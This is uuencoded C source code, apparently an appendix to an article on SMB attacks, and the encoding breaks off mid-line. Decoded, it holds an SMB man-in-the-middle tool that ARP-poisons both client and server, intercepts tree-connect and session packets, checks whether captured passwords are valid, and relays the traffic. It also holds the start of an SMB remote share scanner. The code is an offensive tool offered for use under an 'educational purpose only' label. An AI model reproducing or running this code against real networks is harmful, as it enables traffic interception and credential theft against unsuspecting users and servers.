M+RHJ*BHJ*BHJ*BHJ4T5455!8(%)%4$Q9*BHJ*BHJ*BHJ*BHJ*BHJ+PT*#0H@
M4F5A9&quot;A3;V-K4VUB4V5R=F5R+%!A8VME=&quot;D[#0H-&quot;B!M96UC&lt;&#039;DH#0H@(&quot;`@
M(&quot;`@(&quot;AU7V-H87(@*BD@*&quot;9.8G1397-S:6]N*2P-&quot;B`@(&quot;`@(&quot;`@*&#039;5?8VAA
M&lt;B`J*2`H4&amp;%C:V5T*2P-&quot;B`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I
M*3L-&quot;B`-&quot;B`@(`T*(&amp;EF*&quot;!N=&amp;]H&lt;RA.8G1397-S:6]N+DQE;F=T:&quot;D@/B`S
M-2`I#0H@&gt;PT*(&quot;!P&lt;FEN=&amp;8H(D%C8V5S&lt;R!G&lt;F%N=&amp;5D(&quot;T^(%!A&lt;W-W;W)D
M(&#039;9A;&amp;ED(&quot;%&lt;;B(I.PT*#0H-&quot;B`@5W)I=&amp;4H4V]C:U!R;WAY+%!A8VME=&quot;D[
M#0H@(`T*+RHJ*BHJ*BHJ*BHJ5$-/3E@@24Y415)#15!424].*BHJ*BHJ*BHJ
M+PT*(&quot;`@#0H@(%)E860H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H-&quot;B`@5W)I=&amp;4H
M4V]C:U-M8E-E&lt;G9E&lt;BQ086-K970I.PT*#0H@(&#039;!R:6YT9B@B4VAA&lt;F4@.B`E
M&lt;UQN(BP-&quot;B`@(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@*%!A8VME=&quot;`K#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)48V]N6%)E&lt;75E&lt;W1(9&#039;(I(&quot;L@,2`I
M*3L-&quot;@T*+RHJ*BHJ*BHJ*BHJ4D5$25)%0U1)3TXJ*BHJ*BHJ*BHJ*BHJ*BHJ
M+PT*#0H@(&quot;\O1&amp;\@&gt;6]U(&#039;=A;G0@=&amp;\@:&amp;%V92!N;VX@8FQO8VMI;F&lt;@&lt;F5A
M9&quot;@I(&amp;-A;&amp;QS(#\-&quot;@T*(&quot;!F8VYT;&quot;A3;V-K4&#039;)O&gt;&#039;DL1E]3151&amp;3&quot;Q/7TY/
M3D),3T-+*3L-&quot;B`@9F-N=&amp;PH4V]C:U-M8E-E&lt;G9E&lt;BQ&amp;7U-%5$9,+$]?3D].
M0DQ/0TLI.PT*#0H@(&#039;=H:6QE*#$I#0H@(&#039;L-&quot;B`@($-O=6YT(#T@&lt;F5A9&quot;A3
M;V-K4&#039;)O&gt;&#039;DL)DYB=%-E&lt;W-I;VXL&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-
M&quot;B`@(`T*(&quot;`@:68H(4-O=6YT*0T*(&quot;`@&gt;PT*(&quot;`@(&#039;!R:6YT9B@B7&amp;Y397-S
M:6]N(&amp;9I;FES:&amp;5D(&quot;%&lt;;B(I.PT*(&quot;`@(&amp;-L;W-E*%-O8VM0&lt;F]X&gt;2D[#0H@
M(&quot;`@8VQO&lt;V4H4V]C:U-M8E-E&lt;G9E&lt;BD[#0H@(&quot;`@&lt;F5T=7)N(#`[#0H@(&quot;!]
M#0H-&quot;B`@(&amp;EF*$-O=6YT(&quot;$](&quot;TQ(&quot;8F($-O=6YT*0T*(&quot;`@&gt;R`-&quot;B`@(&quot;!M
M96US970H4&amp;%C:V5T+#`L25!?34%87U-)6D4I.R`-&quot;B`@(`T*(&quot;`@(&amp;UE;6-P
M&gt;2A086-K970L*&#039;5?8VAA&lt;B`J*2`H)DYB=%-E&lt;W-I;VXI+&#039;-I&gt;F5O9BA.8G13
M97-S:6]N2&amp;1R*2D[#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(`T*(&quot;`@(&#039;)E860H
M4V]C:U!R;WAY+`T*(&quot;`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T(&quot;L@&lt;VEZ
M96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*2P-&quot;B`@(&quot;`@(&quot;`@(&amp;YT;VAS*$YB=%-E&lt;W-I
M;VXN3&amp;5N9W1H*2D[#0H-&quot;B`@(&quot;!W&lt;FET92A3;V-K4VUB4V5R=F5R+`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@*%!A8VME=&quot;DL#0H@(&quot;`@(&quot;`@(&quot;`@;G1O:&#039;,H
M3F)T4V5S&lt;VEO;BY,96YG=&amp;@I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S
M&lt;VEO;DAD&lt;BDI.PT*(&quot;`@?0T*#0H@(&quot;!#;W5N=&quot;`](&#039;)E860H4V]C:U-M8E-E
M&lt;G9E&lt;BPF3F)T4V5S&lt;VEO;BQS:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI.PT*(&quot;`@
M#0H@(&quot;!I9B@A0V]U;G0I#0H@(&quot;![#0H@(&quot;`@&lt;&#039;)I;G1F*&quot;)&lt;;E-E&lt;W-I;VX@
M9FEN:7-H960@(5QN(BD[#0H@(&quot;`@8VQO&lt;V4H4V]C:U!R;WAY*3L-&quot;B`@(&quot;!C
M;&amp;]S92A3;V-K4VUB4V5R=F5R*3L-&quot;B`@(&quot;!R971U&lt;FX@,#L-&quot;B`@(&#039;T-&quot;B`@
M(`T*(&quot;`@:68H0V]U;G0@(3T@+3$@)B8@0V]U;G0I#0H@(&quot;![#0H@(&quot;`@;65M
M&lt;V5T*%!A8VME=&quot;PP+$E07TU!6%]325I%*3L@#0H@(&quot;`-&quot;B`@(&quot;!M96UC&lt;&#039;DH
M4&amp;%C:V5T+&quot;AU7V-H87(@*BD@*&quot;9.8G1397-S:6]N*2QS:7IE;V8H3F)T4V5S
M&lt;VEO;DAD&lt;BDI.PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`-&quot;B`@(&quot;!R96%D*%-O
M8VM3;6)397)V97(L#0H@(&quot;`@(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;A086-K970@*R!S
M:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI+`T*(&quot;`@(&quot;`@(&quot;`@;G1O:&#039;,H3F)T4V5S
M&lt;VEO;BY,96YG=&amp;@I*3L-&quot;@T*(&quot;`@(&#039;=R:71E*%-O8VM0&lt;F]X&gt;2P-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;A086-K970I+`T*(&quot;`@(&quot;`@(&quot;`@(&amp;YT;VAS*$YB
M=%-E&lt;W-I;VXN3&amp;5N9W1H*2`K#0H@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I
M;VY(9&#039;(I*3L-&quot;B`@(&#039;T-&quot;B`@?0T*(&#039;T-&quot;B!E;&#039;-E#0H@&gt;PT*(&quot;!P&lt;FEN=&amp;8H
M(E-E&lt;W-I;VX@9F%I;&amp;5D(&quot;T^(%!A&lt;W-W;W)D(&amp;EN=F%L:60@(5QN(BD[#0H@
M(&quot;`-&quot;B`@5W)I=&amp;4H4V]C:U!R;WAY+%!A8VME=&quot;D[#0H@#0H@(&amp;-L;W-E*%-O
M8VM0&lt;F]X&gt;2D[#0H@(&amp;-L;W-E*%-O8VM3;6)397)V97(I.PT*(&quot;`-&quot;B`@&lt;F5T
M=7)N(#`[#0H@?0T*(`T*(&amp;-L;W-E*%-O8VM0&lt;F]X&gt;2D[#0H@8VQO&lt;V4H4V]C
M:U-M8E-E&lt;G9E&lt;BD[#0H@#0H@&lt;F5T=7)N(#`[#0I](`T*(&quot;`-&quot;@T*#0H-&quot;B\J
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@5$A%($U!24X@
M1E5.0U1)3TX-&quot;BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*97AT97)N
M(&amp;-H87(@*F]P=&amp;%R9SL-&quot;F5X=&amp;5R;B!I;G0@;W!T:6YD.PT*97AT97)N(&amp;EN
M=&quot;!O&lt;&#039;1E&lt;G([#0H-&quot;FEN=&quot;!M86EN*&amp;EN=&quot;!A&lt;F=C+&amp;-H87(@*F%R9W9;72D-
M&quot;GL-&quot;B!S=&amp;%T:6,@8VAA&lt;B!O&lt;&#039;1S=&#039;)I;F=;73TB:3IS.F,Z9CIL.B([#0H@
M:6YT(&amp;]P=&amp;-H.PT*(&amp;EN=&quot;!,:7-T96Y0;W)T(#T@,3$S.3L-&quot;B!C:&amp;%R(&quot;I$
M979I8V4[#0H-&quot;B!S=&#039;)U8W0@&lt;V]C:V%D9&#039;)?:6X@4VUB4V5R=F5R.PT*(&#039;-T
M&lt;G5C=&quot;!S;V-K861D&lt;E]I;B!0&lt;F]X&gt;3L-&quot;B`-&quot;B!I;G0@4V]C:U-M8E-E&lt;G9E
M&lt;CL-&quot;B!I;G0@4V]C:U!R;WAY.PT*#0H@:6YT($-O=6YT.PT*#0H@8VAA&lt;B!#
M:&amp;]I8V4],#L-&quot;@T*+RI3979E&lt;F%L($E0(&amp;%D9&#039;)E&lt;W-E&lt;RHO#0H@=5]I;G0S
M,E]T($UY27`[#0H@#0H@&lt;&amp;-A&lt;%]T(&quot;I$97-C&lt;CL-&quot;B`-&quot;B!U7V-H87(@4F5A
M;$5N971#;&amp;EE;G1;151(7T%,14Y=.PT*(&#039;5?8VAA&lt;B!296%L16YE=%-M8E-E
M&lt;G9E&lt;EM%5$A?04Q%3ET[#0H@=5]C:&amp;%R($UY16YE=%M%5$A?04Q%3ET[#0H@
M#0H@8VAA&lt;B!%&lt;G)B=69;-#`Y-ET[#0H-&quot;B!I9BAA&lt;F=C(#P@,3$I#0H@&gt;PT*
M(&quot;!P&lt;FEN=&amp;8H(EQN4VUB36ED9&amp;QE(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;UI(&amp;EN=&amp;5R9F%C
M92`-&quot;B`@(&quot;`@(&quot;`@(&quot;`M8R!#;&amp;EE;G0G&lt;R!)4&quot;`-&quot;B`@(&quot;`@(&quot;`@(&quot;`M&lt;R!3
M97)V97(G&lt;R!)4&quot;`-&quot;B`@(&quot;`@(&quot;`@(&quot;`M;&quot;!,:7-T96YI;F&lt;@4&amp;]R=`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;UF($9A:V4@25!&lt;;B(I.PT*(&quot;`-&quot;B`@&lt;F5T=7)N(#`[#0H@?0T*
M(`T*(&#039;=H:6QE*&quot;AO&lt;&#039;1C:#T@9V5T;W!T*&amp;%R9V,L87)G=BQO&lt;&#039;1S=&#039;)I;F&lt;I
M*2$]14]&amp;*0T*(&#039;L-&quot;B`@&lt;W=I=&amp;-H*&amp;]P=&amp;-H*0T*(&quot;![#0H@(&quot;!C87-E(&quot;=I
M)SH-&quot;B`@(&quot;!$979I8V4@/2`H8VAA&lt;B`J*2`H;6%L;&amp;]C*&#039;-T&lt;FQE;BAO&lt;&#039;1A
M&lt;F&lt;I*G-I&gt;F5O9BAC:&amp;%R*2DI.PT*(&quot;`@(&#039;-T&lt;FYC&lt;&#039;DH1&amp;5V:6-E+&amp;]P=&amp;%R
M9RQS=&#039;)L96XH;W!T87)G*2D[#0H@(&quot;`@8G)E86L[#0H-&quot;B`@(&amp;-A&lt;V4@)V,G
M.@T*(&quot;`@(&amp;EN971?871O;BAO&lt;&#039;1A&lt;F&lt;L)E!R;WAY+G-I;E]A9&amp;1R*3L-&quot;B`@
M(&quot;!B&lt;F5A:SL-&quot;@T*(&quot;`@8V%S92`G&lt;R&lt;Z#0H@(&quot;`@:6YE=%]A=&amp;]N*&amp;]P=&amp;%R
M9RPF4VUB4V5R=F5R+G-I;E]A9&amp;1R*3L-&quot;B`@(&quot;!B&lt;F5A:SL-&quot;@T*(&quot;`@8V%S
M92`G9B&lt;Z#0H@(&quot;`@37E)&lt;&quot;`](&amp;EN971?861D&lt;BAO&lt;&#039;1A&lt;F&lt;I.PT*(&quot;`@(&amp;)R
M96%K.PT*(&quot;`@#0H@(&quot;!C87-E(&quot;=L)SH-&quot;B`@(&quot;!,:7-T96Y0;W)T(#T@871O
M:2AO&lt;&#039;1A&lt;F&lt;I.PT*(&quot;`@(&amp;)R96%K.PT*(&quot;`@#0H@(&quot;!D969A=6QT(#H-&quot;B`@
M(&quot;!P&lt;FEN=&amp;8H(EQN4VUB36ED9&amp;QE(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@+6D@:6YT97)F
M86-E(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@+6,@0VQI96YT)W,@25`@#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`M&lt;R!397)V97(G&lt;R!)4&quot;`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;UL($QI&lt;W1E;FEN9R!0
M;W)T#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`M9B!&amp;86ME($EP7&amp;XB*3L-&quot;B`@(&quot;!R971U&lt;FX@
M,#L-&quot;B`@(&#039;T-&quot;B`@?0T*#0H@1&amp;5S8W(@/2!P8V%P7V]P96Y?;&amp;EV92A$979I
M8V4L25!?34%87U-)6D4L,2PP+$5R&lt;F)U9BD[#0H-&quot;B`@&lt;&#039;)I;G1F*&quot;)&lt;;D1O
M(&#039;EO=2!W86YT(%=I;C)K+UA0(&#039;-U&lt;&#039;!O&lt;G0@*$Y&quot;5&quot;!D:7-A8FQE9&quot;`A*2`Z
M(&#039;DO;C]&lt;;B(I.PT*(&quot;!#:&amp;]I8V4@/2!G971C:&amp;%R*&quot;D[#0H@(&amp;=E=&amp;-H87(H
M*3L-&quot;@T*($=E=$5N971!9&amp;1R97-S*$UY16YE=&quot;Q$979I8V4I.PT*#0HO*E1O
M(&amp;AA=F4@=&amp;AE($U!0R!A9&#039;)E&lt;W,@;V8@=&amp;AE(&amp;-L:65N=&quot;HO#0H@#0H@07)P
M4F5Q=65S=$EN:F5C=&amp;EO;B@F37E)&lt;&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;90&lt;F]X&gt;2YS:6Y?861D&lt;BYS7V%D9&#039;(L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!-&gt;45N970L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!296%L16YE=$-L:65N
M=&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($1E=FEC92P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@($1E&lt;V-R*3L-&quot;@T*+RI4;R!H879E(&#039;1H92!-04,@861R97-S
M(&amp;]F(&#039;1H92!S97)V97(J+PT*(`T*($%R&lt;%)E&lt;75E&lt;W1);FIE8W1I;VXH)DUY
M27`L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;93;6)397)V97(N&lt;VEN7V%D9&#039;(N&lt;U]A9&amp;1R
M+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!-&gt;45N970L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%)E86Q%
M;F5T4VUB4V5R=F5R+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!$979I8V4L#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@($1E&lt;V-R*3L-&quot;@T*+RI!&lt;G`@&lt;&amp;]I&lt;V]N:6YG(&amp;%G86EN&lt;W0@=&amp;AE
M(&#039;-E&lt;G9E&lt;BHO#0H@#0H@07)P4&amp;]I&lt;V]N*`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`F4&#039;)O&gt;&#039;DN
M&lt;VEN7V%D9&#039;(N&lt;U]A9&amp;1R+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`F4VUB4V5R=F5R+G-I;E]A
M9&amp;1R+G-?861D&lt;BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@37E%;F5T+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;!2
M96%L16YE=%-M8E-E&lt;G9E&lt;BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@1&amp;5V:6-E*3L-&quot;@T*+RI!
M&lt;G`@&lt;&amp;]I&lt;V]N:6YG(&amp;%G86EN&lt;W0@=&amp;AE(&amp;-L:65N=&quot;HO#0H-&quot;B!!&lt;G!0;VES
M;VXH#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;93;6)397)V97(N&lt;VEN7V%D9&#039;(N&lt;U]A9&amp;1R+`T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`F4&#039;)O&gt;&#039;DN&lt;VEN7V%D9&#039;(N&lt;U]A9&amp;1R+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;!-&gt;45N970L#0H@(&quot;`@(&quot;`@(&quot;`@(%)E86Q%;F5T0VQI96YT+`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;!$979I8V4I.PT*#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*
M(&#039;-W:71C:&quot;A#:&amp;]I8V4I#0H@&gt;PT*(&quot;!C87-E(&quot;=Y)R`Z#0H@(%-M8E-E&lt;G9E
M&lt;BYS:6Y?&lt;&amp;]R=&quot;`](&amp;AT;VYS*%--0E]03U)47UA07S)+*3L-&quot;B`@8G)E86L[
M#0H@(`T*(&quot;!C87-E(&quot;=N)R`Z#0H@(%-M8E-E&lt;G9E&lt;BYS:6Y?&lt;&amp;]R=&quot;`](&amp;AT
M;VYS*%--0E]03U)4*3L-&quot;B`@8G)E86L[#0H-&quot;B`@9&amp;5F875L=&quot;`Z#0H@(&#039;!R
M:6YT9B@B7&amp;Y0;&amp;5A&lt;V4@86YS=V5R(&amp;)Y(&#039;D@;W(@;B!F;W(@=&amp;AE(&#039;=I;C)K
M+UA0(&#039;-U&lt;&#039;!O&lt;G1&lt;;B(I.PT*(&quot;!R971U&lt;FX@,#L@#0H@?0T*(`T*(%-M8E-E
M&lt;G9E&lt;BYS:6Y?9F%M:6QY(#T@049?24Y%5#L-&quot;B!3;V-K4VUB4V5R=F5R(#T@
M&lt;V]C:V5T*$%&amp;7TE.150L4T]#2U]35%)%04TL-BD[#0H-&quot;B!0&lt;F]X&gt;2YS:6Y?
M9F%M:6QY(#T@049?24Y%5#L-&quot;B!0&lt;F]X&gt;2YS:6Y?&lt;&amp;]R=&quot;`](&amp;AT;VYS*$QI
M&lt;W1E;E!O&lt;G0I.R`-&quot;B!0&lt;F]X&gt;2YS:6Y?861D&lt;BYS7V%D9&#039;(]:&#039;1O;FPH24Y!
M1$127T%.62D[#0H@#0H@4V]C:U!R;WAY(#T@&lt;V]C:V5T*$%&amp;7TE.150L4T]#
M2U]35%)%04TL-BD[#0H@#0HO*E-T87)T(&#039;1O(&amp;QI&lt;W1E;B!F;W(@:6YC;VUI
M;F&lt;@8V]N;FYE&gt;&amp;EO;BHO#0H@#0H@8FEN9&quot;@-&quot;B`@(&quot;`@(%-O8VM0&lt;F]X&gt;2P-
M&quot;B`@(&quot;`@(&quot;AS=&#039;)U8W0@&lt;V]C:V%D9&#039;(@*BD@*&quot;90&lt;F]X&gt;2DL#0H@(&quot;`@(&quot;!S
M:7IE;V8H&lt;W1R=6-T(&#039;-O8VMA9&amp;1R7VEN*0T*(&quot;`@(&quot;`@*3L-&quot;@T*(&amp;QI&lt;W1E
M;BA3;V-K4&#039;)O&gt;&#039;DL,2D[#0H-&quot;B!#;W5N=&quot;`](&#039;-I&gt;F5O9BAS=&#039;)U8W0@&lt;V]C
M:V%D9&#039;)?:6XI.PT*#0H@4V]C:U!R;WAY(#T@86-C97!T*`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;!3;V-K4&#039;)O&gt;&#039;DL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;AS
M=&#039;)U8W0@&lt;V]C:V%D9&#039;(@*BD@*&quot;90&lt;F]X&gt;2DL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;AI;G0@*BD@*&quot;9#;W5N=&quot;D-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`I.PT*
M#0H@8V]N;F5C=&quot;@-&quot;B`@(&quot;`@(&quot;`@(%-O8VM3;6)397)V97(L#0H@(&quot;`@(&quot;`@
M(&quot;`H&lt;W1R=6-T(&#039;-O8VMA9&amp;1R(&quot;HI(&quot;@F4VUB4V5R=F5R*2P-&quot;B`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BAS=&#039;)U8W0@&lt;V]C:V%D9&#039;)?:6XI#0H@(&quot;`@(&quot;`@(&quot;D[#0H@#0HO
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*E!!0TM%5&quot;!!3D%,65-)4RHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*(&amp;EF*$-H;VEC92`]/2`G&gt;2&lt;I
M#0H@&gt;PD@#0H@(&quot;\J8V]N;F5X:6]N(&amp;]N(&#039;!O&lt;G0@-#0U*B\-&quot;B`-&quot;B`@5VEN
M,FM84%-U&lt;&#039;!O&lt;G0H4V]C:U!R;WAY+%-O8VM3;6)397)V97(I.PT*(&#039;T-&quot;B!E
M;&#039;-E#0H@&gt;PT*(&quot;`O*DYO&lt;FUA;&quot;!C;VYN97AI;VX@;VX@&lt;&amp;]R=&quot;`Q,SDJ+PT*
M(`T*(&quot;!.;W)M86PH4V]C:U!R;WAY+%-O8VM3;6)397)V97(I.PT*(&#039;T-&quot;B`-
M&quot;B!C;&amp;]S92A3;V-K4VUB4V5R=F5R*3L-&quot;B!C;&amp;]S92A3;V-K4&#039;)O&gt;&#039;DI.PT*
M(`T*(&#039;)E=&#039;5R;B`P.PT*?2`-&quot;B`@#0H-&quot;@T*#0HO*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ5$A%($5.1&quot;HJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHO(&quot;`-&quot;@T*#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BI#550@2$5212HJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHO#0H-&quot;BTM6R`@07!P96YD:7@@0B`-&quot;@T*66]U(&amp;AA=F4@:6X@=&amp;AI&lt;R!P
M87)T(&#039;1H92!S;W5R8V4@;V8@=&amp;AE(&#039;!R;V=R86T@=7-E(&#039;1O(&#039;-C86X@4TU&quot;
M(&#039;-H87)E&lt;RX-&quot;@T*4F5A9&quot;!T:&amp;4@&lt;V]U&lt;F-E+B!9;W4@=VEL;&quot;!F:6YD(&amp;$@
M;&amp;]T(&amp;$@:6YT97)E&lt;W1I;F&lt;@=&amp;AI;F=S(&amp;%B;W5T(%--0BX-&quot;@T*268@&gt;6]U
M(&#039;=A;G0@=&amp;\@8V]M&lt;&amp;EL92!I=&quot;P@=&amp;AE(&amp;-O;6UA;F0@:7,@(F=C8R!S8V%N
M7W-H87)E+F,@+6\@4TU&quot;&lt;V-A;B(N#0H-&quot;DEF(&#039;EO=2!W86YT(&#039;1O(&#039;5S92!I
M=&quot;`Z(%--0G-C86X@+7,@(G-E&lt;G9E&lt;B!)4&quot;(@+6X@(EEO=7(@;F5T8FEO&lt;R!N
M86UE(BX-&quot;@T*(G-E&lt;G9E&lt;B!)4&quot;(@:7,@=&amp;AE($E0(&amp;%D9&#039;)E&lt;W,@;V8@=&amp;AE
M(%--0B!S97)V97(N#0H-&quot;B)9;W5R(&amp;YE=&amp;)I;W,@;F%M92(@&lt;W1R:6YG(&amp;ES
M(&#039;=H870@&gt;6]U(&#039;=A;G0N(&quot;AL97-S(&#039;1H86X@,34@8VAA&lt;F%C=&amp;5R&lt;RD-&quot;@T*
M4W5C8V5S&lt;V9U;&amp;QY(&#039;1E&lt;W1E9&quot;!W:71H(&#039;-A;6)A(&#039;-E&lt;G9E&lt;B`R+C`@+@T*
M#0I9;W4@&lt;VAO=6QD;B=T(&#039;5S92!I=&quot;!O;B!T:&amp;4@;&amp;]O&lt;&amp;)A8VL@:6YT97)F
M86-E+@T*#0I4:&amp;ES(&#039;!R;V=R86T@9&amp;]E&lt;VXG=&quot;!S=7!P;W)T(%5.24-/1$4@
M&lt;W1R:6YG&lt;RX-&quot;@T*#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ0U54($A%4D4J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ+PT*
M+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(%--0B!30T%.(%)%34]412!32$%215,-&quot;@D)(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M0V]D960@8GD@;&amp;5D:6X-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;&amp;5D:6Y`
M96YC97!H86QO;BUZ97)O+F-O;0T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($9O
M&lt;B!E9&#039;5C871I;VYA;&quot;!P=7)P;W-E(&amp;]N;&#039;D@(0T**BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ+PT*#0HC:6YC;&#039;5D92`\&lt;W1D:6\N:#X-&quot;B-I;F-L=61E(#QS
M=&#039;)I;F&lt;N:#X-&quot;B-I;F-L=61E(#QS=&amp;1L:6(N:#X-&quot;B-I;F-L=61E(#QU;FES
M=&amp;0N:#X-&quot;B-I;F-L=61E(#QE&lt;G)N;RYH/@T*(VEN8VQU9&amp;4@/&#039;-I9VYA;&quot;YH
M/@T*(VEN8VQU9&amp;4@/&#039;-Y&lt;R]I;V-T;&quot;YH/@T*(VEN8VQU9&amp;4@/&#039;-Y&lt;R]T:6UE
M+F@^#0HC:6YC;&#039;5D92`\&lt;WES+W=A:70N:#X-&quot;B-I;F-L=61E(#QS&gt;7,O&lt;W1A
M=&quot;YH/@T*#0HC:6YC;&#039;5D92`\;F5T+VEF+F@^#0HC:6YC;&#039;5D92`\&lt;WES+W-O
M8VME=&quot;YH/@T*(VEN8VQU9&amp;4@/&amp;%R&lt;&amp;$O:6YE=&quot;YH/@T*#0HC:6YC;&#039;5D92`\
M;F5T:6YE=&quot;]I&lt;&quot;YH/@T*(VEN8VQU9&amp;4@/&amp;YE=&amp;EN970O:6XN:#X-&quot;B-I;F-L
M=61E(#QN971I;F5T+W1C&lt;&quot;YH/@T*(VEN8VQU9&amp;4@/&amp;YE=&amp;EN970O=61P+F@^
M#0HC:6YC;&#039;5D92`\;F5T:6YE=&quot;]I9E]E=&amp;AE&lt;BYH/@T*#0HC:6YC;&#039;5D92`\
M;&amp;EB;F5T+F@^#0HC:6YC;&#039;5D92`\&lt;&amp;-A&lt;&quot;YH/@T*#0HC9&amp;5F:6YE(%--0E]0
M3U)4&quot;3$S.0T*#0HC9&amp;5F:6YE&quot;75?:6YT.%]T&quot;75N&lt;VEG;F5D(&amp;-H87(-&quot;@T*
M(V1E9FEN90EU7VEN=#$V7W0)=6YS:6=N960@&lt;VAO&lt;G0-&quot;@T*(V1E9FEN90EU
M7VEN=#,R7W0)=6YS:6=N960@:6YT(`T*#0HC9&amp;5F:6YE&quot;75C:&amp;%R&quot;75N&lt;VEG
